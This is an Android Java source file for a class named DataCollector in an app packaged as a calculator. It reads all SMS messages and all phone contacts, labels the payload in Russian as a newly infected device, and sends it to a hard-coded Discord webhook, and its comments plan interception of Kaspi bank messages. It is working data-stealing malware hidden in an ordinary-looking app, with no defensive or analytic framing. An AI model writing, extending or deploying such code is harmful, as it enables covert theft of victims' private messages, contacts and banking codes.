package com.example.calculator;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class DataCollector {
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK";

    public static void collectAndSend(final Context context) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONObject payload = new JSONObject();
                    payload.put("content", "**Новый заражённый устройство**");

                    // Сбор SMS
                    JSONArray smsArray = new JSONArray();
                    Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                            String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                            JSONObject sms = new JSONObject();
                            sms.put("from", address);
                            sms.put("text", body);
                            smsArray.put(sms);
                        }
                        cursor.close();
                    }
                    payload.put("sms", smsArray);

                    // Сбор контактов
                    JSONArray contactsArray = new JSONArray();
                    Cursor contactCursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                    if (contactCursor != null) {
                        while (contactCursor.moveToNext()) {
                            String name = contactCursor.getString(contactCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                            String number = contactCursor.getString(contactCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            JSONObject contact = new JSONObject();
                            contact.put("name", name);
                            contact.put("number", number);
                            contactsArray.put(contact);
                        }
                        contactCursor.close();
                    }
                    payload.put("contacts", contactsArray);

                    // Сбор данных Kaspi (имитация, так как нужен AccessibilityService)
                    // Перехват сообщений Kaspi будет через SMSReceiver

                    sendToDiscord(payload.toString());

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private static void sendToDiscord(String message) {
        try {
            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            OutputStream os = conn.getOutputStream();
            os.write(message.getBytes());
            os.flush();
            os.close();
            int responseCode = conn.getResponseCode();
            Log.d("Discord", "Response: " + responseCode);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
